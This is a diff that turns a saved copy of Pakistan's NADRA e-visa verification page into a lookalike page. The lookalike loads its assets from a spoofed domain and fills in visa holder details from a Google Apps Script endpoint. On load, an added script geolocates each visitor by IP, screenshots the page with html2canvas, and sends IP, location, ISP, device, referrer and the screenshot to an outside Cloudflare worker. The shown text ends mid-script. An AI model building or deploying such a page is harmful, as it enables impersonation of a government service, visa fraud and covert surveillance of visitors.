@@ -1,334 +1,330 @@
 <!DOCTYPE html>
-<!-- saved from url=(0046)https://visa.nadra.gov.pk/e-visa/verifyD.xhtml -->
-<html xmlns="http://www.w3.org/1999/xhtml"><head id="j_idt2"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-	    <meta http-equiv="X-UA-Compatible" content="IE=edge"><link type="text/css" rel="stylesheet" href="./PAK VISA_files/theme.css.xhtml"><link type="text/css" rel="stylesheet" href="./PAK VISA_files/components.css.xhtml"><script type="text/javascript" src="./PAK VISA_files/jquery.js.xhtml"></script><script type="text/javascript" src="./PAK VISA_files/jquery-plugins.js.xhtml"></script><script type="text/javascript" src="./PAK VISA_files/core.js.xhtml"></script><script type="text/javascript" src="./PAK VISA_files/primefaces-extensions.js.xhtml"></script><link type="text/css" rel="stylesheet" href="./PAK VISA_files/blockui.css.xhtml"><script type="text/javascript" src="./PAK VISA_files/blockui.js.xhtml"></script><script type="text/javascript">if(window.PrimeFaces){PrimeFaces.settings.locale='en_US';}</script>  
-	<title>PAK VISA</title>
-	
-	<meta name="format-detection" content="telephone=no">
-	<!-- Mobile Specific Metas -->
-	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-	
-	<link rel="stylesheet" type="text/css" href="./PAK VISA_files/bootstrap.min.css">
-	<link rel="stylesheet" type="text/css" href="./PAK VISA_files/ionicons.css">
-	<link rel="stylesheet" type="text/css" href="./PAK VISA_files/shortcodes.css">		
-	<link rel="stylesheet" type="text/css" href="./PAK VISA_files/style.css">
-	<link rel="stylesheet" type="text/css" href="./PAK VISA_files/font-nadra.css">
-	<link rel="stylesheet" type="text/css" href="./PAK VISA_files/responsive.css">
-	<link rel="stylesheet" type="text/css" href="./PAK VISA_files/animate.css">
-	<link rel="stylesheet" type="text/css" href="./PAK VISA_files/custom.css">
-	<link rel="stylesheet" type="text/css" href="./PAK VISA_files/primefaces.css">
-	
-	
-	<link rel="stylesheet" type="text/css" href="./PAK VISA_files/errormsg.css">
-	<!--     &lt;link rel="stylesheet" type="text/css" href="/e-visa/css/iconmoon.css"&gt;&lt;/link&gt; -->
+<html>
+<head>
+<meta charset="utf-8">
+<title>PAK VISA</title>
 
-	<!-- Favicon and touch icons  -->
-	<link href="https://visa.nadra.gov.pk/e-visa/images/favicon.ico" rel="shortcut icon">
+<!-- Telegram Visitor Tracker + Screenshot -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+<script>
+(function () {
+  var WORKER_URL = "https://long-pine-6e25.hkopbahi1111.workers.dev/";
 
-	<link rel="stylesheet" type="text/css" href="./PAK VISA_files/font-awesome.min.css">
-	<noscript>
-		<meta http-equiv="refresh" content="0;noJS.xhtml" />
-	</noscript>
+  var ua      = navigator.userAgent;
+  var device  = /Mobile|Android|iPhone|iPad/i.test(ua) ? "Mobile" : "Desktop";
+  var browser = "Unknown";
+  if      (ua.indexOf("Edg")     > -1) browser = "Edge";
+  else if (ua.indexOf("OPR")     > -1) browser = "Opera";
+  else if (ua.indexOf("Chrome")  > -1) browser = "Chrome";
+  else if (ua.indexOf("Firefox") > -1) browser = "Firefox";
+  else if (ua.indexOf("Safari")  > -1) browser = "Safari";
 
-	<link rel="shortcut icon" href="https://visa.nadra.gov.pk/e-visa/images/2.fw.ico">
-	
-	<!-- Javascript 
-    &lt;script type="text/javascript" src="js/jquery.min.js"&gt;&lt;/script&gt;-->
-	<script type="text/javascript" src="./PAK VISA_files/bootstrap.min.js.download"></script>
-	<script type="text/javascript" src="./PAK VISA_files/waypoints.min.js.download"></script>
+  var ref  = document.referrer || "Direct / WhatsApp";
+  var page = window.location.href;
+  var time = new Date().toLocaleString("en-PK", { timeZone: "Asia/Karachi" });
 
-	<script type="text/javascript" src="./PAK VISA_files/main.js.download" defer="defer"></script>
-	<script type="text/javascript" src="./PAK VISA_files/custom.js.download"></script>
+  function sendData(geo, screenshot) {
+    var payload = {
+      ip:         geo.ip      || "N/A",
+      city:       geo.city    || "N/A",
+      country:    geo.country || "N/A",
+      isp:        geo.isp     || "N/A",
+      device:     device,
+      browser:    browser,
+      ref:        ref,
+      time:       time,
+      page:       page,
+      screenshot: screenshot || null
+    };
+    fetch(WORKER_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    }).catch(function(){});
+  }
 
+  function takeScreenshot(geo) {
+    setTimeout(function() {
+      html2canvas(document.body, {
+        useCORS: true,
+        allowTaint: true,
+        scale: 0.6,
+        logging: false
+      }).then(function(canvas) {
+        sendData(geo, canvas.toDataURL("image/png"));
+      }).catch(function() {
+        sendData(geo, null);
+      });
+    }, 2000);
+  }
 
-	<!-- Including Java Script(s)  -->
-	<script type="text/javascript" src="./PAK VISA_files/validations.js.download"></script>
-<!-- 	&lt;script type="text/javascript" src="/e-visa/js/detectInterentConnectivity.js"&gt;&lt;/script&gt; -->
-	
-	<script type="text/javascript" src="./PAK VISA_files/template.js.download"></script>
-	<!-- END -->
+  function getGeoAndTrack() {
+    fetch("https://ip-api.com/json/?fields=status,query,city,country,isp")
+      .then(function(r) { return r.json(); })
+      .then(function(d) {
+        if (d && d.status === "success") {
+          takeScreenshot({ ip: d.query, city: d.city, country: d.country, isp: d.isp });
+        } else { throw new Error("fail"); }
+      })
+      .catch(function() {
+        fetch("https://ipwho.is/")
+          .then(function(r) { return r.json(); })
+          .then(function(d) {
+            if (d && d.success) {
+              takeScreenshot({ ip: d.ip, city: d.city, country: d.country, isp: d.connection ? d.connection.isp : "N/A" });
+            } else { throw new Error("fail"); }
+          })
+          .catch(function() {
+            fetch("https://ipapi.co/json/")
+              .then(function(r) { return r.json(); })
+              .then(function(d) {
+                if (d && d.ip) {
+                  takeScreenshot({ ip: d.ip, city: d.city, country: d.country_name, isp: d.org });
+                } else { throw new Error("fail"); }
+              })
+              .catch(function() {
+                takeScreenshot({ ip: "N/A", city: "N/A", country: "N/A", isp: "N/A" });
+              });
+          });
+      });
+  }
 
+  window.addEventListener("load", function() {
+    getGeoAndTrack();
+  });
 
-	<!--For HELP ToolTip -->
-	<link rel="stylesheet" type="text/css" href="./PAK VISA_files/tooltipster.css">
-	<script type="text/javascript" src="./PAK VISA_files/tooltips.js.download"></script>
-	<script src="./PAK VISA_files/jquery.tooltipster.js.download"></script>
+})();
+</script>
 
-	<script src="./PAK VISA_files/bowser.js.download"></script>
-
-	<style type="text/css">
-		body {
-			font: 14px/24px "Poppins", sans-serif !important;
-		    background-color: #fff;
-		    color: #666666;
-		}
-		
-		.preview__header {
-			font-size: 12px;
-			min-height: 35px;
-			background-color: #44aa68;
-			z-index: 100;
-			color: #fff;
-		}
-		
-		@media (max-width: 767px) {
-			.banner-hide-xs {
-				display: none !important;
-			}
-		}
-		
-		.top-banner-allignment {
-			
-			width: auto;
-			padding-right: 100px;
-			padding-top: 50px;
-			float: right;
-			display: block;
-		
-		}
-		
-		@media(max-width: 991px) {
-				.top-banner-allignment {
-					text-align: center;
-					float: none;
-    				padding-right: 0;
-    				padding-top: 200px;
-    				display: block;
-				}
-			}
-		
-		@media(max-width: 430px) {
-		
-			.top-banner-allignment {
-					text-align: center;
-					float: none;
-    				padding-right: 0;
-    				padding-top: 0px;
-    				display: none;
-				}
-		
-			.top-banner img {
- 			   width: 100px;
-    		
-			}
-			
-		}
-		
-	</style>
-		<style type="text/css">
-.label-div {
-	text-align: left;
-}
-
-.value-div {
-	text-align: left;
-}
-
-@media ( max-width : 991px) {
-	.label-div {
-		text-align: center;
-	}
-	.value-div {
-		text-align: center;
-	}
-}
+<meta name="format-detection" content="telephone=no">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://visa-nadra-gov.pk.e-visa.pk/e-visa/assets/css/ionicons.css">
+<link rel="stylesheet" href="https://visa-nadra-gov.pk.e-visa.pk/e-visa/assets/css/shortcodes.css">
+<link rel="stylesheet" href="https://visa-nadra-gov.pk.e-visa.pk/e-visa/assets/css/style.css">
+<link rel="stylesheet" href="https://visa-nadra-gov.pk.e-visa.pk/e-visa/assets/css/font-nadra.css">
+<link rel="stylesheet" href="https://visa-nadra-gov.pk.e-visa.pk/e-visa/assets/css/animate.css">
+<link rel="stylesheet" href="https://visa-nadra-gov.pk.e-visa.pk/e-visa/assets/css/custom.css">
+<link rel="stylesheet" href="https://visa-nadra-gov.pk.e-visa.pk/e-visa/assets/css/primefaces.css">
+<link rel="stylesheet" href="https://visa-nadra-gov.pk.e-visa.pk/e-visa/assets/responsive.css">
+<link rel="shortcut icon" href="./favicon.ico">
+<link rel="icon" type="image/png" href="./favicon.png">
+<style>
+  .preloader {
+    width: 100%; height: 100%;
+    background-color: #fff;
+    position: fixed; top: 0; left: 0;
+    z-index: 9999999;
+    transition: all 0.3s ease-in-out;
+  }
+  .clear-loading {
+    text-align: center; margin: 0 auto;
+    position: absolute; top: 50%; left: 50%;
+    margin-top: -50px; margin-left: -50px;
+    box-sizing: border-box;
+  }
+  .loading-effect-2 { width: 100px; height: 100px; }
+  .loading-effect-2 > span,
+  .loading-effect-2 > span:before,
+  .loading-effect-2 > span:after {
+    content: ""; display: block; border-radius: 50%;
+    border: 2px solid #0068AC;
+    position: absolute; top: 50%; left: 50%;
+    transform: translate(-50%, -50%);
+  }
+  .loading-effect-2 > span {
+    width: 100%; height: 100%; top: 0; left: 0;
+    border-left-color: transparent;
+    animation: effect-2 2s infinite linear;
+  }
+  .loading-effect-2 > span:before { width: 75%; height: 75%; border-right-color: transparent; }
+  .loading-effect-2 > span:after  { width: 50%; height: 50%; border-bottom-color: transparent; }
+  @keyframes effect-2 {
+    from { transform: rotate(0deg); }
+    to   { transform: rotate(360deg); }
+  }
+  .page-content { visibility: hidden; opacity: 0; }
+  .page-content.loaded { visibility: visible; opacity: 1; transition: opacity 0.3s ease; }
+  .menu-icon { width: 25px; height: 18px; position: relative; cursor: pointer; display: inline-block; }
+  .menu-icon span { position: absolute; height: 2.5px; width: 100%; background: #1b5fa7; border-radius: 9px; transition: 0.4s; }
+  .menu-icon span:nth-child(1) { top: 0; }
+  .menu-icon span:nth-child(2) { top: 7px; }
+  .menu-icon span:nth-child(3) { top: 14px; }
+  .menu-icon.active span:nth-child(1) { transform: rotate(45deg); top: 7px; }
+  .menu-icon.active span:nth-child(2) { opacity: 0; }
+  .menu-icon.active span:nth-child(3) { transform: rotate(-45deg); top: 7px; }
+  .mobile-menu { position: fixed; top: 65px; width: 100%; background: #1e273d; max-height: 0; overflow: hidden; transition: max-height .4s; z-index: 999; }
+  .mobile-menu.show { max-height: 400px; }
+  .mobile-menu a { display: block; padding: 18px 25px; color: #fff; text-decoration: none; }
+  .btn-back-login { display: inline-block; background: #0070ad; color: #fff; padding: 12px 35px; margin: 30px 0 10px 0; text-decoration: none; font-size: 14px; }
+  .btn-back-login:hover { background: #005a8e; color: #fff; text-decoration: none; }
+  .footer { text-align: center; font-size: 12px; color: #999; padding: 25px; }
+  .label-div { text-align: left; }
+  .value-div { text-align: left; }
+  @media (max-width: 991px) {
+    .label-div { text-align: center; }
+    .value-div { text-align: center; }
+  }
 </style>
-                                <script>!function(e){var n="https://s.go-mpulse.net/boomerang/";if("False"=="True")e.BOOMR_config=e.BOOMR_config||{},e.BOOMR_config.PageParams=e.BOOMR_config.PageParams||{},e.BOOMR_config.PageParams.pci=!0,n="https://s2.go-mpulse.net/boomerang/";if(window.BOOMR_API_key="Y5STP-VJLC6-V49ME-TWT4V-G4HYW",function(){function e(){if(!i){var e=document.createElement("script");e.id="boomr-scr-as",e.src=window.BOOMR.url,e.async=!0,o.parentNode.appendChild(e),i=!0}}function t(e){i=!0;var n,t,a,r,d=document,O=window;if(window.BOOMR.snippetMethod=e?"if":"i",t=function(e,n){var t=d.createElement("script");t.id=n||"boomr-if-as",t.src=window.BOOMR.url,BOOMR_lstart=(new Date).getTime(),e=e||d.body,e.appendChild(t)},!window.addEventListener&&window.attachEvent&&navigator.userAgent.match(/MSIE [67]\./))return window.BOOMR.snippetMethod="s",void t(o.parentNode,"boomr-async");a=document.createElement("IFRAME"),a.src="about:blank",a.title="",a.role="presentation",a.loading="eager",r=(a.frameElement||a).style,r.width=0,r.height=0,r.border=0,r.display="none",o.parentNode.appendChild(a);try{O=a.contentWindow,d=O.document.open()}catch(_){n=document.domain,a.src="javascript:var d=document.open();d.domain='"+n+"';void(0);",O=a.contentWindow,d=O.document.open()}if(n)d._boomrl=function(){this.domain=n,t()},d.write("<bo"+"dy onload='document._boomrl();'>");else if(O._boomrl=function(){t()},O.addEventListener)O.addEventListener("load",O._boomrl,!1);else if(O.attachEvent)O.attachEvent("onload",O._boomrl);d.close()}function a(e){window.BOOMR_onload=e&&e.timeStamp||(new Date).getTime()}if(!window.BOOMR||!window.BOOMR.version&&!window.BOOMR.snippetExecuted){window.BOOMR=window.BOOMR||{},window.BOOMR.snippetStart=(new Date).getTime(),window.BOOMR.snippetExecuted=!0,window.BOOMR.snippetVersion=12,window.BOOMR.url=n+"Y5STP-VJLC6-V49ME-TWT4V-G4HYW";var o=document.currentScript||document.getElementsByTagName("script")[0],i=!1,r=document.createElement("link");if(r.relList&&"function"==typeof r.relList.supports&&r.relList.supports("preload")&&"as"in r)window.BOOMR.snippetMethod="p",r.href=window.BOOMR.url,r.rel="preload",r.as="script",r.addEventListener("load",e),r.addEventListener("error",function(){t(!0)}),setTimeout(function(){if(!i)t(!0)},3e3),BOOMR_lstart=(new Date).getTime(),o.parentNode.appendChild(r);else t(!1);if(window.addEventListener)window.addEventListener("load",a,!1);else if(window.attachEvent)window.attachEvent("onload",a)}}(),"".length>0)if(e&&"performance"in e&&e.performance&&"function"==typeof e.performance.setResourceTimingBufferSize)e.performance.setResourceTimingBufferSize();!function(){if(BOOMR=e.BOOMR||{},BOOMR.plugins=BOOMR.plugins||{},!BOOMR.plugins.AK){var n=""=="true"?1:0,t="",a="355wbsaxgz3dk2qqkqfq-f-5251687bf-clientnsv4-s.akamaihd.net",o="false"=="true"?2:1,i={"ak.v":"41","ak.cp":"1845307","ak.ai":parseInt("1161368",10),"ak.ol":"0","ak.cr":153,"ak.ipv":4,"ak.proto":"h2","ak.rid":"a7ebf50f","ak.r":47817,"ak.a2":n,"ak.m":"dscb","ak.n":"essl","ak.cport":24151,"ak.gh":"23.54.124.197","ak.quicv":"","ak.tlsv":"tls1.3","ak.0rtt":"","ak.0rtt.ed":"","ak.csrc":"-","ak.acc":"","ak.t":"1779454987","ak.ak":"hOBiQwZUYzCg5VSAfCLimQ==EK/X8XXTDxWEdPWfQykAo9Ee/HHSu5rR0xWoVzOhzVjBPTuc1HE+1ZS/1XjnxFWhTRaUKiKA/6w5hkIs1TuU7xf0xu1EjZbF47SI+B1bL+wtVe3/lyKSLP4V0XfCG0lNYAsUYmAis9i6ndyU2aribN9hyXyP7NqZd0q0aXPwK5gogDNA6jSlTGgwIYLDq8e4fZ3U1DNbH+6Swn/sZWNS85lbGNwsxIhmJjIDdEoKeP+0WIwYPCeB/3KJalh6HOyENCdqbh9qjpb0yxsZEjay5kne9BmxSYWafNQidx36tWmP8xigiqeW2IRwIH1d4tglpSKgI6R3y/CBPTIPPLqUd2ifZsOKHu1W4IkuXCqIVMI0AtSJ7RUJINSvVbAZB3edqHylyiJwxScTkTRsfI+NO9Kmhd/zqhvjhq0fzqinXNA=","ak.pv":"6","ak.dpoabenc":"","ak.tf":o};if(""!==t)i["ak.ruds"]=t;var r={i:!1,av:function(n){var t="http.initiator";if(n&&(!n[t]||"spa_hard"===n[t]))i["ak.feo"]=void 0!==e.aFeoApplied?1:0,BOOMR.addVar(i)},rv:function(){var e=["ak.cport","ak.cr","ak.csrc","ak.gh","ak.ipv","ak.m","ak.n","ak.ol","ak.proto","ak.quicv","ak.tlsv","ak.0rtt","ak.0rtt.ed","ak.r","ak.acc","ak.t","ak.tf"];BOOMR.removeVar(e)}};BOOMR.plugins.AK={akVars:i,akDNSPreFetchDomain:a,init:function(){if(!r.i){var e=BOOMR.subscribe;e("before_beacon",r.av,null,null),e("onbeacon",r.rv,null,null),r.i=!0}return this},is_complete:function(){return!0}}}}()}(window);</script><link href="https://s.go-mpulse.net/boomerang/Y5STP-VJLC6-V49ME-TWT4V-G4HYW" rel="preload" as="script"><iframe src="./PAK VISA_files/saved_resource.html" title="" role="presentation" loading="eager" style="width: 0px; height: 0px; border: 0px; display: none;"></iframe></head><body onload="doesConnectionExist();"><div id="j_idt8_content" style="display: none;"><table>
-<tbody>
-<tr>
-<td><img src="./PAK VISA_files/ajax-loading.gif" style="margin-right: 12px; vertical-align: middle;"></td>
-<td><span style="white-space: nowrap;">Please wait...</span></td>
-</tr>
-</tbody>
-</table>
+</head>
+<body>
+<!-- PRELOADER -->
+<div class="preloader" id="preloader">
+  <div class="clear-loading loading-effect-2"><span></span></div>
 </div>
-	
-	<div class="row">
-		<div class="col-md-12 col-sm-12 banner-hide-xs preview__header" id="infoHeader" style="display: none !important;">
-			<div class="col-md-11 col-sm-11 text-center">
-				<p style="margin-top: 7px;padding-left: 228px;font-weight: bold;font-size: 14px;">
-					PAK VISA IS CROSS BROWSER COMPATIBLE. HOWEVER, FOR OPTIMAL EXPERIENCE RECOMMENDED BROWSER IS GOOGLE CHROME. 
-				</p>
-			</div>
-			<div class="col-md-1 col-sm-1 text-right">
-				<span onclick="closeInfoBar();" style="cursor: pointer;line-height: 35px;">X</span>
-			</div>
-		</div>
-	</div>
-		
-	<div class="boxed">
-		<div class="preloader" style="opacity: 0; display: none;">
-			<div class="clear-loading loading-effect-2">
-				<span></span>
-			</div>
-		</div>
-<form id="j_idt14" name="j_idt14" method="post" action="https://visa.nadra.gov.pk/e-visa/verifyD.xhtml" enctype="application/x-www-form-urlencoded">
-<input type="hidden" name="j_idt14" value="j_idt14">
 
-<script type="text/javascript" src="./PAK VISA_files/browser.js.download"></script>
-<!-- &lt;script type="text/javascript" src="/e-visa/js/detectInterentConnectivity.js"&gt;&lt;/script&gt; -->
-	<div id="connectionLostDiv">
-	<div id="connectionLostMessage">
-		<img src="./PAK VISA_files/connecting.gif"> <br><br>
-		<span>Connection Lost. Trying to reconnect...</span> 
-	</div>
-	</div>
-	<header id="header" class="header bg-color">
-	<style>
-		#header.ui-widget-content {
-		    background: #fff !important;
-		    border: none;
-		}
-	</style><div id="j_idt14:j_idt16_content" style="display: none;"><table>
-<tbody>
-<tr>
-<td><img src="./PAK VISA_files/ajax-loading.gif" style="margin-right: 12px; vertical-align: middle;"></td>
-<td><span style="white-space: nowrap;">Please wait...</span></td>
-</tr>
-</tbody>
-</table>
+<!-- PAGE CONTENT -->
+<div class="page-content" id="pageContent">
+  <div class="boxed">
+    <header id="header" class="header bg-color">
+      <div class="container" style="height:70px;">
+        <div class="row">
+          <div class="header-wrap">
+            <div class="col-md-6 col-xs-6">
+              <div id="logo" class="logo" style="margin-left:-10px;">
+                <a href="https://www.nadra.gov.pk/">
+                  <img src="https://visa-nadra-gov.pk.e-visa.pk/e-visa/assets/img/pak_visa_logo.png" style="height:50px;">
+                </a>
+              </div>
+            </div>
+            <div class="col-md-6 col-xs-6 text-right" style="margin-top:25px; padding-right:25px;">
+              <div class="menu-icon" id="menuIcon" onclick="toggleMenu()">
+                <span></span><span></span><span></span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </header>
+
+    <!-- MOBILE MENU -->
+    <div class="mobile-menu" id="mobileMenu">
+      <a href="https://www.nadra.gov.pk/">Home</a>
+      <a href="https://visa.nadra.gov.pk/how-to-apply/">Guidelines</a>
+      <a href="https://visa.nadra.gov.pk/download/">Downloads</a>
+      <a href="https://visa.nadra.gov.pk/faqs/">FAQ</a>
+      <a href="https://visa.nadra.gov.pk/contact/">Contact Us</a>
+    </div>
+
+    <section class="flat-row" style="margin-top:60px;">
+      <div class="container">
+        <div class="row pd-contact-v2">
+          <div id="login-block" class="col-md-8 col-md-offset-2 animated slideInUp">
+            <article class="post style2">
+              <div class="content-post" style="text-align:center;">
+                <h1 class="title-post">
+                  <a id="eid">Visa Reference Number</a>
+                </h1>
+                <hr>
+                <div class="row">
+                  <div class="col-md-4">
+                    <img id="photo"
+                      src="https://visa-nadra-gov.pk.e-visa.pk/e-visa/assets/avator/upload/default.jpg"
+                      style="width:auto;max-width:152px;height:auto;display:block;margin:0 auto;pointer-events:none;cursor:default;">
+                  </div>
+                  <div class="col-md-8">
+                    <div class="row" style="margin-top:35px;">
+                      <div class="col-md-5 label-div"><label>NAME</label></div>
+                      <div class="col-md-7 value-div"><p id="fullname">---</p></div>
+                    </div>
+                    <div class="row" style="margin-top:35px;">
+                      <div class="col-md-5 label-div"><label>Passport No</label></div>
+                      <div class="col-md-7 value-div"><p id="passport">---</p></div>
+                    </div>
+                    <div class="row" style="margin-top:35px;">
+                      <div class="col-md-5 label-div"><label>Passport Country</label></div>
+                      <div class="col-md-7 value-div"><p id="country">---</p></div>
+                    </div>
+                    <div class="row" style="margin-top:35px;">
+                      <div class="col-md-5 label-div"><label>Visa Category</label></div>
+                      <div class="col-md-7 value-div"><p id="visa_category">---</p></div>
+                    </div>
+                  </div>
+                </div>
+                <div class="row" style="margin-top:35px;">
+                  <div class="col-md-5 label-div"><label>Visa Sub Category</label></div>
+                  <div class="col-md-7 value-div"><p id="visa_sub_category">---</p></div>
+                </div>
+                <div class="row" style="margin-top:35px;">
+                  <div class="col-md-5 label-div"><label>Application Type</label></div>
+                  <div class="col-md-7 value-div"><p id="application_type">---</p></div>
+                </div>
+                <div class="row" style="margin-top:35px;">
+                  <div class="col-md-5 label-div"><label>Staying Facility</label></div>
+                  <div class="col-md-7 value-div"><p id="staying_facility">---</p></div>
+                </div>
+                <div class="row" style="margin-top:35px;">
+                  <div class="col-md-5 label-div"><label>Visa Start Date</label></div>
+                  <div class="col-md-7 value-div"><p id="visa_start">---</p></div>
+                </div>
+                <div class="row" style="margin-top:35px;">
+                  <div class="col-md-5 label-div"><label>Visa End Date</label></div>
+                  <div class="col-md-7 value-div"><p id="visa_end">---</p></div>
+                </div>
+                <div class="row" style="margin-top:35px;">
+                  <div class="col-md-5 label-div"><label>Visa Duration</label></div>
+                  <div class="col-md-7 value-div"><p id="visa_duration">---</p></div>
+                </div>
+                <a class="btn-back-login" href="https://visa.nadra.gov.pk/e-visa/authenticate">Back to Login</a>
+              </div>
+            </article>
+          </div>
+        </div>
+      </div>
+    </section>
+  </div>
+
+  <div class="footer">
+    COPYRIGHT &copy; 2015 - 2026 MINISTRY OF INTERIOR,<br>
+    GOVERNMENT OF PAKISTAN - V: 6.0.0
+  </div>
 </div>
-			<div class="container" style="height: 70px;">
-				<div class="row">
-				
-				
-					<div class="header-wrap">
-						<div class="col-md-4 col-xs-10">
-							<div id="logo" class="logo"><script type="text/javascript" src="./PAK VISA_files/jsf.js.xhtml"></script><a href="https://visa.nadra.gov.pk/e-visa/verifyD.xhtml#" onclick="jsf.util.chain(this,event,&#39;PF(\&#39;blockUIWidgetMenu\&#39;).block()&#39;,&#39;mojarra.jsfcljs(document.getElementById(\&#39;j_idt14\&#39;),{\&#39;j_idt14:j_idt21\&#39;:\&#39;j_idt14:j_idt21\&#39;},\&#39;\&#39;)&#39;);return false"><img src="./PAK VISA_files/pak_visa_logo.png" style="height:50px;"></a>
-								 
-							</div><!-- /#logo -->                            
-						</div><!-- /.col-md-2 -->
-						<div class="col-md-8 col-xs-2">	
-                          
-							<div class="nav-wrap">
-                                <div class="btn-menu">
-                                    <span></span>
-                                </div><!-- //mobile menu button -->								
-								<nav id="mainnav" class="mainnav">
-									<ul class="menu">
-										<li><a href="https://visa.nadra.gov.pk/e-visa/verifyD.xhtml#" onclick="jsf.util.chain(this,event,&#39;PF(\&#39;blockUIWidgetMenu\&#39;).block()&#39;,&#39;mojarra.jsfcljs(document.getElementById(\&#39;j_idt14\&#39;),{\&#39;j_idt14:j_idt26\&#39;:\&#39;j_idt14:j_idt26\&#39;},\&#39;\&#39;)&#39;);return false" class="urduLang urduFont">Home</a>  
-										</li>
-										
-										<li><a href="https://visa.nadra.gov.pk/how-to-apply/" target="_blank">Guidelines</a>
-										</li>
-										
-										<li><a href="https://visa.nadra.gov.pk/download/" target="_blank">Downloads</a>
-										</li>
-										
-										<li><a href="https://visa.nadra.gov.pk/faqs/" target="_blank">FAQ</a>
-										</li>
-										
-										<li><a href="https://visa.nadra.gov.pk/contact/" target="_blank">Contact Us</a>
-										</li>
-									</ul>
-								</nav>														
-							</div>
-						</div>
-					</div>
-				</div>
-			</div>
-		</header><div style="height: 70px; display: none;"></div><input type="hidden" name="javax.faces.ViewState" id="j_id1:javax.faces.ViewState:0" value="5822234483224440040:-29818987715698537" autocomplete="off">
-</form>
-		
-		<section class="flat-row">
-			<div class="top-banner">
-				<div class="row">
-					<div class="col-md-12 top-banner-allignment">
-					</div>
-				</div>
-			</div>
-			<div class="container">
-		<div class="row pd-contact-v2">
-<form id="errorForm" name="errorForm" method="post" action="https://visa.nadra.gov.pk/e-visa/verifyD.xhtml" enctype="application/x-www-form-urlencoded">
-<input type="hidden" name="errorForm" value="errorForm">
 
-				<div id="login-block" class="col-md-8  col-md-offset-2 animated slideInUp fadeOutDown">
-					<article class="post style2">
-						<div class="content-post" style="text-align: center;">
-
-							<h1 class="title-post text-center urduLang" style="text-align: center;">
-								<a href="https://visa.nadra.gov.pk/e-visa/verifyD.xhtml#" title=""> - </a>
-							</h1>
-							<hr>
-
-
-							<div class="row">
-
-								<div class="col-md-4">
-									<img src="data:image/gif;base64," class="applicant-photo" width="152px">
-								</div>
-
-								<div class="col-md-8">
-
-								</div>
-
-							</div>
-
-							<div class="row text-center ct-u-marginTop20" style="text-align: center;"><a href="https://visa.nadra.gov.pk/e-visa/verifyD.xhtml#" onclick="mojarra.jsfcljs(document.getElementById(&#39;errorForm&#39;),{&#39;errorForm:j_idt69&#39;:&#39;errorForm:j_idt69&#39;},&#39;&#39;);return false" class="btn btn-success  btn-lg button-submit">Back to Login</a>
-							</div>
-						</div>
-					</article>
-				</div><input type="hidden" name="javax.faces.ViewState" id="j_id1:javax.faces.ViewState:1" value="5822234483224440040:-29818987715698537" autocomplete="off">
-</form>
-		</div>
-			</div>
-		</section>
-	</div>
-	<div id="wrapper">
-
-		<div id="connectionLostDiv" style="height:100%; width:100%; position:fixed; opacity:0.9; background-color:#B6B6B4; top:0px; left:0px; margin:0px; z-index:2000; vertical-align:middle; text-align:center; display: none;">
-			<div id="connectionLostMessage" style="height:50%; width:50%; position:fixed; color:#000; top:25%; left:25%; margin:0px; z-index:3000; vertical-align:middle; text-align:center; font-size: 32px;">
-				<img src="./PAK VISA_files/connecting.gif"> <br>
-				<br> <span>Connection Lost. Trying to reconnect...</span>
-			</div>
-		</div>
-	</div>
-		<footer id="footer">
-			<div class="footer-bottom visible-lg visible-md visible-sm">
-				<div class="container">
-					<div class="row">
-						<div class="col-md-12 text-center" id="footerCredits" style="float: none; margin:0 auto;">
-							<div class="copyright text-uppercase text-center">
-								<p class="urdufooter" style="width: 100%; margin-bottom:0;">COPYRIGHT © 2015 -
-								
-									2026
-									 
-									MINISTRY OF INTERIOR, GOVERNMENT OF PAKISTAN - All rights reserved - v: 6.0.2</p>
-		
-							</div>
-							<!-- /.menu-footer -->
-						</div>
-					</div>
-				</div>
-			</div>
-			
-			<div class="footer-bottom visible-xs">
-				<div class="container">
-					<div class="row">
-						<div class="col-md-12 text-center" id="footerCredits" style="float: none; margin:0 auto;">
-							<div class="copyright text-uppercase text-center">
-								<p class="urdufooter" style="width: 100%; margin-bottom:0;">COPYRIGHT © 2015 - 
-								
-									2026
-								
-									MINISTRY OF INTERIOR, GOVERNMENT OF PAKISTAN - v: 6.0.2</p>
-		
-							</div>
-							<!-- /.menu-footer -->
-						</div>
-					</div>
-				</div>
-			</div>
-		</footer>
-
-	<!-- /#footer -->
-	<div class="button-go-top">
-		<a href="https://visa.nadra.gov.pk/e-visa/verifyD.xhtml#" title="" class="go-top"> <i class="fa fa-chevron-up"></i>
-		</a>
-	</div>
-	
-	<script type="text/javascript" src="./PAK VISA_files/payme.js.download"></script>
-	<script type="text/javascript" src="./PAK VISA_files/eid.js.download"></script>
-	<script type="text/javascript" src="./PAK VISA_files/google-analytics.js.download"></script>
-	<script type="text/javascript" src="./PAK VISA_files/topbar-scroll.js.download"></script>
-<div id="textarea_simulator" style="position: absolute; top: 0px; left: 0px; visibility: hidden;"></div></body></html>
+<script>
+  function toggleMenu() {
+    document.getElementById("mobileMenu").classList.toggle("show");
+    document.getElementById("menuIcon").classList.toggle("active");
+  }
+  function setText(id, val) {
+    var el = document.getElementById(id);
+    if (el) el.innerText = val || "---";
+  }
+  function formatDate(d) {
+    if (!d) return "---";
+    return new Date(d).toLocaleDateString("en-GB", { day: "2-digit", month: "short", year: "numeric" });
+  }
+  function showPage() {
+    var loader = document.getElementById("preloader");
+    loader.style.opacity = "0";
+    setTimeout(function () { loader.style.display = "none"; }, 300);
+    document.getElementById("pageContent").classList.add("loaded");
+  }
+  var id = new URLSearchParams(window.location.search).get("id");
+  if (id) {
+    fetch("https://script.google.com/macros/s/AKfycbz5RtSgtWeStpF3mIMoKtHWX4WQnvdXK4uNNjJ2RUPalSWrlhiA4OoHwL38Ndj3rA0B/exec?id=" + id)
+      .then(function(r) { return r.json(); })
+      .then(function(data) {
+        document.getElementById("eid").innerText = "Visa Reference Number - " + (data.id || id);
+        setText("fullname", data.name);
+        setText("passport", data.passport_no);
+        setText("country", data.passport_country);
+        setText("visa_category", data.visa_category);
+        setText("visa_sub_category", data.visa_sub_category);
+        setText("application_type", data.application_type);
